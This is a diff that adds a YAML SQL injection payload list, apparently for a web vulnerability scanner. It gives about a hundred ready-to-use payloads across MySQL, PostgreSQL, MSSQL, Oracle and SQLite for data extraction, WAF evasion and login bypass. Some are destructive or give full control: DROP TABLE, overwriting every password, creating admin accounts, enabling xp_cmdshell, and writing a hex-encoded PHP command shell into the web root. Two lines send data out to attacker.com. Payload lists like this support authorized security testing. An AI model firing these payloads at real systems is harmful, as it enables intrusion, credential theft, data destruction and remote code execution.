@@ -1,0 +1,641 @@
+﻿# payloads/sqli.yaml
+# SQL Injection payloads - Error-based, Union-based, Boolean-blind, Time-based, WAF bypass
+
+# ─── ERROR-BASED: MySQL ───────────────────────────────────────────────────────
+- payload: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))-- -"
+  description: "MySQL error-based extraction via EXTRACTVALUE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)-- -"
+  description: "MySQL error-based extraction via UPDATEXML"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT user()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -"
+  description: "MySQL FLOOR+RAND duplicate key error based extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND EXP(~(SELECT * FROM(SELECT user())a))-- -"
+  description: "MySQL double EXP overflow error-based"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND GEOMETRYCOLLECTION((SELECT * FROM(SELECT * FROM(SELECT user())a)b))-- -"
+  description: "MySQL GeometryCollection spatial error-based"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND polygon((SELECT * FROM(SELECT * FROM(SELECT user())a)b))-- -"
+  description: "MySQL Polygon geometry error-based"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND multipoint((SELECT * FROM(SELECT * FROM(SELECT user())a)b))-- -"
+  description: "MySQL MultiPoint geometry error-based"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND linestring((SELECT * FROM(SELECT * FROM(SELECT user())a)b))-- -"
+  description: "MySQL LineString geometry error-based"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+# ─── ERROR-BASED: PostgreSQL ─────────────────────────────────────────────────
+- payload: "' AND 1=CAST((SELECT version()) AS INT)-- -"
+  description: "PostgreSQL type cast error-based extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND (SELECT 1/(SELECT 0))-- -"
+  description: "PostgreSQL division by zero error"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "';SELECT CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS INTEGER)-- -"
+  description: "PostgreSQL stacked query cast error"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND convert_from(decode((SELECT encode(version()::bytea,'hex')),'hex'),'UTF-8')=''-- -"
+  description: "PostgreSQL encode/decode chain error"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+# ─── ERROR-BASED: MSSQL ──────────────────────────────────────────────────────
+- payload: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- -"
+  description: "MSSQL CONVERT error-based table extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND 1=db_name()-- -"
+  description: "MSSQL db_name() error trigger"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "';SELECT * FROM OPENROWSET('SQLOLEDB','';'sa';'','SELECT 1')-- -"
+  description: "MSSQL OPENROWSET linked server auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND 1=CAST(@@version AS INT)-- -"
+  description: "MSSQL CAST @@version to int error-based"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "';DECLARE @q NVARCHAR(4000);SET @q=0x530045004c004500430054002000760065007200730069006f006e00280029;EXEC(@q)-- -"
+  description: "MSSQL hex-encoded dynamic exec"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── ERROR-BASED: Oracle ─────────────────────────────────────────────────────
+- payload: "' AND 1=utl_inaddr.get_host_name((SELECT user FROM dual))-- -"
+  description: "Oracle UTL_INADDR error-based user extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND 1=ctxsys.drithsx.sn(1,(SELECT user FROM dual))-- -"
+  description: "Oracle CTX error-based extraction"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL FROM dual-- -"
+  description: "Oracle UNION NULL column test using dual"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND 1=XMLTYPE((SELECT DBMS_XMLGEN.GETXML('SELECT user FROM dual') FROM dual))-- -"
+  description: "Oracle XMLTYPE error-based extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── ERROR-BASED: SQLite ──────────────────────────────────────────────────────
+- payload: "' AND 1=load_extension(0x2e2e2f2e2e2f2e2e2f)-- -"
+  description: "SQLite load_extension error trigger"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT typeof(1),typeof('a'),typeof(1.0),typeof(NULL),typeof(X'61')-- -"
+  description: "SQLite type disclosure via UNION"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+# ─── UNION-BASED: 1-10 columns ────────────────────────────────────────────────
+- payload: "' UNION SELECT NULL-- -"
+  description: "Union 1-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL-- -"
+  description: "Union 2-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL-- -"
+  description: "Union 3-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL-- -"
+  description: "Union 4-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 5-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 6-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 7-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 8-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 9-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -"
+  description: "Union 10-column NULL probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' UNION SELECT user(),database(),version()-- -"
+  description: "MySQL 3-col union data extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -"
+  description: "MySQL UNION table name dump"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273-- -"
+  description: "MySQL UNION column dump from users table (hex encoded table name)"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION ALL SELECT 'a',NULL,NULL-- -"
+  description: "UNION ALL string probe column 1"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+# ─── BOOLEAN-BLIND ────────────────────────────────────────────────────────────
+- payload: "' AND 1=1-- -"
+  description: "Boolean true condition"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND 1=2-- -"
+  description: "Boolean false condition"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND 'a'='a'-- -"
+  description: "Boolean string true condition"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND 'a'='b'-- -"
+  description: "Boolean string false condition"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND SUBSTRING(version(),1,1)='5'-- -"
+  description: "MySQL boolean blind version char extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND SUBSTRING((SELECT database()),1,1)='a'-- -"
+  description: "MySQL boolean blind database name first char"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND ASCII(SUBSTR((SELECT user()),1,1))>64-- -"
+  description: "MySQL boolean blind ASCII comparison user extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0-- -"
+  description: "Boolean blind table count check"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND MID((SELECT password FROM users LIMIT 1),1,1)=CHAR(97)-- -"
+  description: "MySQL boolean blind password char extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 1),1,1))>31-- -"
+  description: "MySQL boolean blind ORD/MID username extraction"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── TIME-BASED ───────────────────────────────────────────────────────────────
+- payload: "' AND SLEEP(5)-- -"
+  description: "MySQL SLEEP time-based blind"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -"
+  description: "MySQL nested SLEEP time-based blind"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+- payload: "'; WAITFOR DELAY '0:0:5'-- -"
+  description: "MSSQL WAITFOR DELAY time-based blind"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "'; IF (1=1) WAITFOR DELAY '0:0:5'-- -"
+  description: "MSSQL conditional WAITFOR time-based blind"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND 1=(SELECT 1 FROM pg_sleep(5))-- -"
+  description: "PostgreSQL pg_sleep time-based blind"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "';SELECT pg_sleep(5)-- -"
+  description: "PostgreSQL stacked pg_sleep"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' OR SLEEP(5)-- -"
+  description: "MySQL OR SLEEP time-based"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND BENCHMARK(10000000,MD5(1))-- -"
+  description: "MySQL BENCHMARK heavy computation time-based"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "1; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -"
+  description: "PostgreSQL CASE+pg_sleep conditional time-based"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "' AND (SELECT 1 FROM(SELECT SLEEP(5) WHERE 1=1)a)-- -"
+  description: "MySQL SLEEP subquery time-based"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+# ─── COMMENT VARIANTS ─────────────────────────────────────────────────────────
+- payload: "' OR 1=1--"
+  description: "Double-dash comment variant"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 1=1#"
+  description: "Hash comment variant (MySQL)"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 1=1/*"
+  description: "C-style comment variant"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 1=1/*!*/"
+  description: "MySQL version comment exclamation variant"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' /*!OR*/ 1=1-- -"
+  description: "MySQL inline version comment OR bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR/**/1=1-- -"
+  description: "C comment whitespace bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'/*!50000OR*/1=1-- -"
+  description: "MySQL conditional comment version bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+# ─── WAF BYPASS ───────────────────────────────────────────────────────────────
+- payload: "' /*!UNION*/ /*!SELECT*/ user(),2,3-- -"
+  description: "MySQL version comment UNION SELECT WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "%27%20UNION%20SELECT%20user%28%29%2C2%2C3--%20-"
+  description: "URL-encoded UNION SELECT"
+  bypass_waf: true
+  encoding: "url"
+  severity: "critical"
+
+- payload: "%2527%2520UNION%2520SELECT%2520user()%2C2%2C3--%2520-"
+  description: "Double URL-encoded UNION SELECT"
+  bypass_waf: true
+  encoding: "double_url"
+  severity: "critical"
+
+- payload: "' UNiOn SeLeCt user(),2,3-- -"
+  description: "Case variation UNION SELECT WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'\t UNION\t SELECT\t user(),2,3-- -"
+  description: "Tab whitespace UNION SELECT bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'\nUNION\nSELECT\nuser(),2,3-- -"
+  description: "Newline whitespace UNION SELECT bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION%0ASELECT%0Auser(),2,3-- -"
+  description: "URL-encoded newline whitespace bypass"
+  bypass_waf: true
+  encoding: "url"
+  severity: "critical"
+
+- payload: "' AND 0x31=0x31-- -"
+  description: "Hex comparison WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' AND CHAR(49)=CHAR(49)-- -"
+  description: "CHAR() comparison WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "medium"
+
+- payload: "';EXEC(CHAR(115)+CHAR(101)+CHAR(108)+CHAR(101)+CHAR(99)+CHAR(116)+CHAR(32)+CHAR(49))-- -"
+  description: "MSSQL CHAR concat exec WAF bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' AND/**/ 1=1-- -"
+  description: "Multi-line comment whitespace bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "medium"
+
+- payload: "' OR 'unusual'='unusual"
+  description: "String comparison no comment bypass"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "1' oR '1'='1"
+  description: "Mixed case string or-injection"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "admin'/*"
+  description: "MySQL comment to truncate remaining query"
+  bypass_waf: true
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION SELECT CHAR(117,115,101,114)-- -"
+  description: "MSSQL CHAR list for string obfuscation"
+  bypass_waf: true
+  encoding: "none"
+  severity: "high"
+
+# ─── HEADER INJECTION ─────────────────────────────────────────────────────────
+- payload: "1' AND SLEEP(5)-- -"
+  description: "SQLi in X-Forwarded-For header"
+  bypass_waf: false
+  encoding: "none"
+  severity: "high"
+
+- payload: "127.0.0.1' UNION SELECT user(),2,3-- -"
+  description: "SQLi via User-Agent or X-Real-IP header"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; INSERT INTO logs(data) VALUES('pwned')-- -"
+  description: "Second-order SQLi via header stored payload"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── SECOND-ORDER SQLI ────────────────────────────────────────────────────────
+- payload: "admin'-- -"
+  description: "Second-order admin login bypass stored payload"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; UPDATE users SET password='hacked' WHERE '1'='1"
+  description: "Second-order UPDATE all passwords payload"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; DROP TABLE sessions-- -"
+  description: "Second-order destructive DROP statement"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "1'; INSERT INTO admins(user,pass) VALUES('evil','evil')-- -"
+  description: "Second-order admin account creation"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── STACKED QUERIES ──────────────────────────────────────────────────────────
+- payload: "'; SELECT 1-- -"
+  description: "Stacked query probe"
+  bypass_waf: false
+  encoding: "none"
+  severity: "medium"
+
+- payload: "1; EXEC xp_cmdshell('whoami')-- -"
+  description: "MSSQL stacked xp_cmdshell RCE"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -"
+  description: "MSSQL enable xp_cmdshell via stacked"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; CREATE USER hacker WITH PASSWORD 'hacked'-- -"
+  description: "PostgreSQL stacked user creation"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── OOB / DNS-BASED ──────────────────────────────────────────────────────────
+- payload: "' AND LOAD_FILE(CONCAT('\\\\\\\\',user(),'.attacker.com\\\\a'))-- -"
+  description: "MySQL OOB DNS via LOAD_FILE UNC path"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "'; EXEC xp_dirtree '//attacker.com/share'-- -"
+  description: "MSSQL OOB DNS via xp_dirtree"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' UNION SELECT LOAD_FILE('/etc/passwd')-- -"
+  description: "MySQL LOAD_FILE /etc/passwd read"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY 0x3c3f7068702073797374656d28245f4745545b2763275d293b3f3e-- -"
+  description: "MySQL INTO OUTFILE PHP shell write"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+# ─── AUTHENTICATION BYPASS ────────────────────────────────────────────────────
+- payload: "' OR 1=1-- -"
+  description: "Classic auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 'x'='x"
+  description: "String auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "') OR ('1'='1"
+  description: "Parenthetical auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "admin' --"
+  description: "Admin login comment bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "admin'#"
+  description: "Admin login hash bypass MySQL"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 1-- -"
+  description: "Numeric boolean auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "') OR 1=1-- -"
+  description: "Parenthesis close auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "1' OR '1'='1'-- -"
+  description: "String equivalence auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "' OR 1=1 LIMIT 1-- -"
+  description: "Auth bypass with result limit"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
+
+- payload: "\" OR \"\"=\""
+  description: "Double-quote string auth bypass"
+  bypass_waf: false
+  encoding: "none"
+  severity: "critical"
